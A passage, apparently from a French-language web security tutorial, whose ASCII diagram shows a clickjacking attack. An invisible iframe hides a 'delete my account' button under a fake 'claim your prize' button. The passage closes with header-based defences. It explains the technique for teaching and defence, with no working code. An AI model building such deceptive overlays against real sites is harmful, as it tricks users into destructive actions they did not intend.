    │                                                                │
    │   CE QUE VOIT LA VICTIME:                                      │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │                                                          │ │
    │   │   🎁 Félicitations! Vous avez gagné!                     │ │
    │   │                                                          │ │
    │   │         ┌────────────────────┐                           │ │
    │   │         │  Récupérer mon     │  ← Bouton visible         │ │
    │   │         │      prix!         │                           │ │
    │   │         └────────────────────┘                           │ │
    │   │                                                          │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   CE QUI SE PASSE RÉELLEMENT:                                  │
    │   ┌──────────────────────────────────────────────────────────┐ │
    │   │                                                          │ │
    │   │   🎁 Félicitations!                                      │ │
    │   │                                                          | │
    │   │   ┌─────────────────────────────────────────────────┐    │ │
    │   │   │  IFRAME INVISIBLE (opacity: 0)                  │    │ │
    │   │   │  ┌────────────────────┐                         │    │ │
    │   │   │  │  SUPPRIMER MON     │ ← Le VRAI bouton        │    │ │
    │   │   │  │     COMPTE         │    (invisible)          │    │ │
    │   │   │  └────────────────────┘                         │    │ │
    │   │   └─────────────────────────────────────────────────┘    │ │
    │   │                                                          │ │
    │   └──────────────────────────────────────────────────────────┘ │
    │                                                                │
    │   Le clic sur "Récupérer prix" = clic sur "Supprimer compte"!  │
    │                                                                │
    └────────────────────────────────────────────────────────────────┘

    ┌────────────────────────────────────────────────────────────────┐
    │  PROTECTION                                                    │
    │                                                                │
    │  X-Frame-Options: DENY                                         │
    │  X-Frame-Options: SAMEORIGIN                                   │
    │  Content-Security-Policy: frame-ancestors 'none'               │
    └────────────────────────────────────────────────────────────────┘
```

---
